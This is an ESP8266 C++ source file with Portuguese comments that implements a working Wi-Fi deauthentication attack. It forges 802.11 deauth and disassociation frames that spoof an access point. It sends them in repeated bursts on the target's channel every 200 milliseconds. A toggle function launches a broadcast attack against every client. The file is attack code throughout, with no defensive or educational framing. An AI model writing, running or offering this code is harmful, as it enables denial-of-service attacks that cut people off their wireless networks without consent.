#include "deauther.h"

#include <ESP8266WiFi.h>

extern "C"
{
#include "user_interface.h"
}

// Variáveis de controle do ataque
static bool attackActive = false;
static uint8_t targetApMac[6];
static uint8_t targetClientMac[6];
static uint8_t targetChannel = 1;
static uint8_t attackReason = 7;
static unsigned long lastAttackPacketAt = 0;

// Pacote melhorado (mais compatível)
static uint8_t deauthPacket[26] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
    /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

void initDeauther()
{
    // Inicializar WiFi para modo promiscuo se necessário
    // Mas por enquanto, assume que WiFi já está configurado
}

void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
{
    // MUITO IMPORTANTE: Mudar para o canal do alvo
    if (WiFi.channel() != channel) {
        wifi_set_channel(channel);
    }

    // Deauth para o cliente
    memcpy(&deauthPacket[4], clientMac, 6); // Receiver = Cliente
    memcpy(&deauthPacket[10], apMac, 6);    // Transmitter = AP
    memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
    deauthPacket[24] = reason;

    // Envia rajada de deauth
    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delayMicroseconds(200);
    }

    // Disassociation (muitas vezes mais efetivo)
    deauthPacket[0] = 0xA0; // muda para disassociation
    for (int i = 0; i < 5; i++)
    {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delayMicroseconds(200);
    }

    deauthPacket[0] = 0xC0; // volta para deauth
}

void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
{
    memcpy(targetApMac, apMac, 6);
    memcpy(targetClientMac, clientMac, 6);
    targetChannel = channel;
    attackReason = reason;
    attackActive = true;
    lastAttackPacketAt = millis();

    // Envia o primeiro imediatamente
    sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
}

void stopDeauthAttack()
{
    attackActive = false;
}

bool isDeauthActive()
{
    return attackActive;
}

void updateDeauth()
{
    if (attackActive && (millis() - lastAttackPacketAt > 200)) { // Envia a cada 200ms
        sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
        lastAttackPacketAt = millis();
    }
}

void toggleDeauther()
{
    if (attackActive)
    {
        stopDeauthAttack();
    }
    else
    {
        // Example targets for demo - broadcast deauth
        uint8_t apMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        uint8_t clientMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        startDeauthAttack(apMac, clientMac, 1, 7);
    }
}